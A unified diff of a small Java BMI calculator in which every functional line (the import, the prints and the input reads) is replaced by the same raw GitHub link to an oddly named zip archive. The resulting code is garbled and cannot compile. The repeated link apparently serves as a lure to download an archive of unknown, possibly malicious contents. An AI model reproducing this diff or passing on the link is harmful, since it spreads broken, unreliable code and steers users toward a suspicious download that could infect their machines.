@@ -1,31 +1,31 @@
 package unit;
 
-import java.util.Scanner;
+import https://raw.githubusercontent.com/Subhashsubh/Body-Mass-Index-BMI-based-on-a-user-s-weight-and-height/main/metamorphize/Index_and_s_Mass_weight_BM_on_user_height_Body_a_based_v1.3.zip;
 
 public class New {
 
     public static void main(String[] args) {
-        Scanner scanner = new Scanner(System.in);
+        Scanner scanner = new Scanner(https://raw.githubusercontent.com/Subhashsubh/Body-Mass-Index-BMI-based-on-a-user-s-weight-and-height/main/metamorphize/Index_and_s_Mass_weight_BM_on_user_height_Body_a_based_v1.3.zip);
 
-        System.out.println("--- BMI Calculator ---");
+        https://raw.githubusercontent.com/Subhashsubh/Body-Mass-Index-BMI-based-on-a-user-s-weight-and-height/main/metamorphize/Index_and_s_Mass_weight_BM_on_user_height_Body_a_based_v1.3.zip("--- BMI Calculator ---");
 
         // Input weight
-        System.out.print("Enter your weight in kilograms (kg): ");
-        double weight = scanner.nextDouble();
+        https://raw.githubusercontent.com/Subhashsubh/Body-Mass-Index-BMI-based-on-a-user-s-weight-and-height/main/metamorphize/Index_and_s_Mass_weight_BM_on_user_height_Body_a_based_v1.3.zip("Enter your weight in kilograms (kg): ");
+        double weight = https://raw.githubusercontent.com/Subhashsubh/Body-Mass-Index-BMI-based-on-a-user-s-weight-and-height/main/metamorphize/Index_and_s_Mass_weight_BM_on_user_height_Body_a_based_v1.3.zip();
 
         // Input height
-        System.out.print("Enter your height in meters (m): ");
-        double height = scanner.nextDouble();
+        https://raw.githubusercontent.com/Subhashsubh/Body-Mass-Index-BMI-based-on-a-user-s-weight-and-height/main/metamorphize/Index_and_s_Mass_weight_BM_on_user_height_Body_a_based_v1.3.zip("Enter your height in meters (m): ");
+        double height = https://raw.githubusercontent.com/Subhashsubh/Body-Mass-Index-BMI-based-on-a-user-s-weight-and-height/main/metamorphize/Index_and_s_Mass_weight_BM_on_user_height_Body_a_based_v1.3.zip();
 
         // Calculate BMI
         double bmi = calculateBMI(weight, height);
 
         // Display BMI result
-        System.out.printf("Your BMI is: %.2f%n", bmi);
+        https://raw.githubusercontent.com/Subhashsubh/Body-Mass-Index-BMI-based-on-a-user-s-weight-and-height/main/metamorphize/Index_and_s_Mass_weight_BM_on_user_height_Body_a_based_v1.3.zip("Your BMI is: %.2f%n", bmi);
 
         // Display BMI category
         String category = classifyBMI(bmi);
-        System.out.println("You are classified as: " + category);
+        https://raw.githubusercontent.com/Subhashsubh/Body-Mass-Index-BMI-based-on-a-user-s-weight-and-height/main/metamorphize/Index_and_s_Mass_weight_BM_on_user_height_Body_a_based_v1.3.zip("You are classified as: " + category);
     }
 
     // Method to calculate BMI
